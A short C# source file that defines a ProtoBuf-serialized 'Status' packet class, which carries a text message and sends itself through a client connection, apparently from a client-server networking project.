using ProtoBuf;

namespace xClient.Core.Packets.ClientPackets
{
    [ProtoContract]
    public class Status : IPacket
    {
        [ProtoMember(1)]
        public string Message { get; set; }

        public Status()
        {
        }

        public Status(string message)
        {
            Message = message;
        }

        public void Execute(Client client)
        {
            client.Send<Status>(this);
        }
    }
}